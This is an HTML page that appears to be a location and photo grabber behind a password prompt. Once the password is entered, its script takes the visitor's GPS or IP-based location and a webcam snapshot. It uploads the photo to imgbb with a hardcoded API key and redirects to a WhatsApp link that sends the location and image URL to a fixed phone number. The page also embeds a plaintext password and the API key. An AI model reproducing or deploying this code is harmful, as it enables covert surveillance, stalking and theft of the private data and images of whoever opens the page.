<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentication Required</title>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            text-align: center;
            background: #0d1117;
            color: #ffffff;
            margin: 50px;
        }
        input, button {
            padding: 10px;
            margin: 10px;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            transition: 0.3s;
        }
        input {
            background: #161b22;
            color: #ffffff;
            outline: none;
            border: 1px solid #58a6ff;
        }
        button {
            background: #58a6ff;
            color: white;
            cursor: pointer;
            box-shadow: 0px 0px 10px #58a6ff;
        }
        button:hover {
            transform: scale(1.1);
            box-shadow: 0px 0px 20px #58a6ff;
        }
        #auth-section {
            animation: fadeIn 1s ease-in-out;
        }
        #main-content {
            display: none;
            animation: fadeIn 1s ease-in-out;
        }
        #status {
            font-size: 20px;
            font-weight: bold;
            animation: glow 1s infinite alternate;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        @keyframes glow {
            from { color: #58a6ff; }
            to { color: #ffffff; }
        }
    </style>
</head>
<body>
    <div id="auth-section">
        <h2>ðŸ”’ Enter Password to Access</h2>
        <input type="password" id="password" placeholder="Enter password">
        <button onclick="checkPassword()">Submit</button>
        <p id="auth-status" style="color: red;"></p>
    </div>

    <div id="main-content">
        <h1>ðŸ“¡ Sending Live Location & Photo to WhatsApp...</h1>
        <p id="status">Initializing...</p>
        <canvas id="canvas" style="display: none;"></canvas>
    </div>

    <script>
        function checkPassword() {
            const enteredPassword = document.getElementById("password").value;
            const correctPassword = "Nipunapromod@1"; 

            if (enteredPassword === correctPassword) {
                document.getElementById("auth-section").style.display = "none";
                document.getElementById("main-content").style.display = "block";
                getLocation();
            } else {
                document.getElementById("auth-status").innerText = "âŒ Incorrect password!";
            }
        }

        function getLocation() {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    var lat = position.coords.latitude, lng = position.coords.longitude;
                    var loc = `https://www.google.com/maps?q=${lat},${lng}`;
                    document.getElementById("status").innerText = "âœ… Location found! Taking photo...";
                    capturePhoto(loc);
                },
                (error) => {
                    document.getElementById("status").innerText = "âŒ Location denied! Getting IP-based location...";
                    getIPLocation();
                },
                { enableHighAccuracy: true, maximumAge: 0 }
            );
        }

        async function getIPLocation() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                const data = await response.json();

                const loc = `ðŸ“ IP Location: ${data.city}, ${data.region}, ${data.country}\nðŸŒ ISP: ${data.org}\nðŸ”¢ IP: ${data.ip}`;
                document.getElementById("status").innerText = "ðŸŒ IP location found! Taking photo...";
                capturePhoto(loc);
            } catch (error) {
                console.error("IP location error:", error);
                document.getElementById("status").innerText = "âŒ Failed to get location.";
            }
        }

        async function capturePhoto(loc) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement("video");
                video.srcObject = stream;
                video.play();
                video.onloadedmetadata = () => {
                    const canvas = document.getElementById("canvas");
                    const ctx = canvas.getContext("2d");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    stream.getTracks().forEach(t => t.stop());
                    canvas.toBlob((b) => uploadPhoto(b, loc), "image/png");
                };
            } catch (error) {
                console.error("Camera access error:", error);
            }
        }

        function uploadPhoto(blob, loc) {
            const formData = new FormData();
            formData.append("image", blob);
            formData.append("key", "83601732f6095faec5d42577498c1da8");

            fetch("https://api.imgbb.com/1/upload", { method: "POST", body: formData })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        var waUrl = `https://wa.me/94713424265?text=${encodeURIComponent(`${loc}\nðŸ“· Photo: ${data.data.url}`)}`;
                        window.location.href = waUrl;
                    } else {
                        console.error("ImgBB upload failed:", data.error);
                    }
                })
                .catch(error => {
                    console.error("ImgBB API request failed:", error);
                });
        }
    </script>
</body>
</html>
